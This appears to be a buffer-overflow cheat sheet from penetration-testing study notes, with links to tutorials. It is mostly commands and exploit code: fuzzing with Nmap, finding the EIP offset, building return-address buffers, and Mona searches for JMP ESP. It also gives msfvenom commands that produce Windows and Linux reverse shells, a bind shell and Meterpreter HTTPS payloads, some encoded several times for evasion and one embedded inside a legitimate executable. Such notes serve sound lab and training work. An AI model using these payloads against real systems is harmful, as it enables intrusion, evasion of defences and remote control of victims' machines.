Buffer Overflows
===================================================================================================================================

-   DEP and ASLR - Data Execution Prevention (DEP) and Address Space
    Layout Randomization (ASLR)


-   Nmap Fuzzers:

    -   NMap Fuzzer List  
        [https://nmap.org/nsedoc/categories/fuzzer.html](https://nmap.org/nsedoc/categories/fuzzer.html)

    -   NMap HTTP Form Fuzzer  
        `nmap --script http-form-fuzzer --script-args
        'http-form-fuzzer.targets={1={path=/},2={path=/register.html}}'
        -p 80 $ip`

    -   Nmap DNS Fuzzer  
        `nmap --script dns-fuzz --script-args timelimit=2h $ip -d`

-   MSFvenom  
    [*https://www.offensive-security.com/metasploit-unleashed/msfvenom/*](https://www.offensive-security.com/metasploit-unleashed/msfvenom/)

-   Windows Buffer Overflows

    -   Controlling EIP

             locate pattern_create
             pattern_create.rb -l 2700
             locate pattern_offset
             pattern_offset.rb -q 39694438

    -   Verify exact location of EIP - [\*] Exact match at offset 2606

            buffer = "A" \* 2606 + "B" \* 4 + "C" \* 90

    -   Check for “Bad Characters” - Run multiple times 0x00 - 0xFF

    -   Use Mona to determine a module that is unprotected

    -   Bypass DEP if present by finding a Memory Location with Read and Execute access for JMP ESP

    -   Use NASM to determine the HEX code for a JMP ESP instruction

            /usr/share/metasploit-framework/tools/exploit/nasm_shell.rb

            JMP ESP  
            00000000 FFE4 jmp esp

    -   Run Mona in immunity log window to find (FFE4) XEF command

            !mona find -s "\xff\xe4" -m slmfc.dll  
            found at 0x5f4a358f - Flip around for little endian format
            buffer = "A" * 2606 + "\x8f\x35\x4a\x5f" + "C" * 390

    -   MSFVenom to create payload

            msfvenom -p windows/shell_reverse_tcp LHOST=$ip LPORT=443 -f c –e x86/shikata_ga_nai -b "\x00\x0a\x0d"

    -   Final Payload with NOP slide  

            buffer="A"*2606 + "\x8f\x35\x4a\x5f" + "\x90" * 8 + shellcode

    -   Create a PE Reverse Shell  
        `msfvenom -p windows/shell\_reverse\_tcp LHOST=$ip LPORT=4444
        -f  
        exe -o shell\_reverse.exe`

    -   Create a PE Reverse Shell and Encode 9 times with
        Shikata\_ga\_nai  
        `msfvenom -p windows/shell\_reverse\_tcp LHOST=$ip LPORT=4444
        -f  
        exe -e x86/shikata\_ga\_nai -i 9 -o
        shell\_reverse\_msf\_encoded.exe`

    -   Create a PE reverse shell and embed it into an existing
        executable  
        `msfvenom -p windows/shell\_reverse\_tcp LHOST=$ip LPORT=4444 -f
        exe -e x86/shikata\_ga\_nai -i 9 -x
        /usr/share/windows-binaries/plink.exe -o
        shell\_reverse\_msf\_encoded\_embedded.exe`

    -   Create a PE Reverse HTTPS shell  
        `msfvenom -p windows/meterpreter/reverse\_https LHOST=$ip
        LPORT=443 -f exe -o met\_https\_reverse.exe`

-   Linux Buffer Overflows

    -   Run Evans Debugger against an app  
        `edb --run /usr/games/crossfire/bin/crossfire`

    -   ESP register points toward the end of our CBuffer
        ````
        add eax,12  
        jmp eax  
        83C00C add eax,byte +0xc  
        FFE0 jmp eax
        ````

    -   Check for “Bad Characters” Process of elimination - Run multiple
        times 0x00 - 0xFF

    -   Find JMP ESP address  
        "\\x97\\x45\\x13\\x08" \# Found at Address 08134597

    -   crash = "\\x41" \* 4368 + "\\x97\\x45\\x13\\x08" +
        "\\x83\\xc0\\x0c\\xff\\xe0\\x90\\x90"

    -   `msfvenom -p linux/x86/shell\_bind\_tcp LPORT=4444 -f c -b
        "\\x00\\x0a\\x0d\\x20" –e x86/shikata\_ga\_nai`

    -   Connect to the shell with netcat:  
        `nc -v $ip 4444`

## Useful Links

[Buffer Overflow Practice](https://www.vortex.id.au/2017/05/pwkoscp-stack-buffer-overflow-practice/)

[Simple Windows BOF](http://proactivedefender.blogspot.com/2013/05/understanding-buffer-overflows.html?m=1)

[Fuzzy Security - Windows Exploit Development](http://www.fuzzysecurity.com/tutorials.html)

[dostackbufferoverflowgood - easy to read](https://github.com/justinsteven/dostackbufferoverflowgood)

[Exploit Exercises](https://exploit-exercises.com/)

[Corelan's exploit writing tutorial](https://www.corelan.be/index.php/2009/07/19/exploit-writing-tutorial-part-1-stack-based-overflows/)

[Live Overflow's Binary Hacking Videos](https://www.youtube.com/watch?v=iyAyN3GFM7A&list=PLhixgUqwRTjxglIswKp9mpkfPNfHkzyeN)

[Introduction to 32-bit Windows Buffer Overflows](https://www.veteransec.com/blog/introduction-to-32-bit-windows-buffer-overflows)

[Getting Started with x86 Linux Buffer Overflows](https://scriptdotsh.com/index.php/2018/05/14/getting-started-with-linux-buffer-overflows-part-1-introduction/)

https://www.sans.org/reading-room/whitepapers/threats/buffer-overflows-dummies-481

https://www.exploit-db.com/docs/28475.pdf
